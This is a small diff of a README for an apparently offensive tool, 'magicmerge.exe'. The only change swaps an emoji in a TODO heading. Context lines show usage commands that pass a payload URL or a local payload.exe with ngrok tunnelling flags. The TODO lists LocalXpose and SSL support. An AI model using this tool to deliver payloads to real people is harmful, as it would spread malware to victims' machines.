@@ -85,7 +85,7 @@ magicmerge.exe -payload="YourPayloadURL" -url=true -ngrok=true
 ```
 magicmerge.exe -payload="/payload.exe" -url=false -ngrok=false
 ```
-<h2>🛠️ TODO:</h2>
+<h2>🗒️ TODO:</h2>
 
 - LocalXpose support
 - SSL support
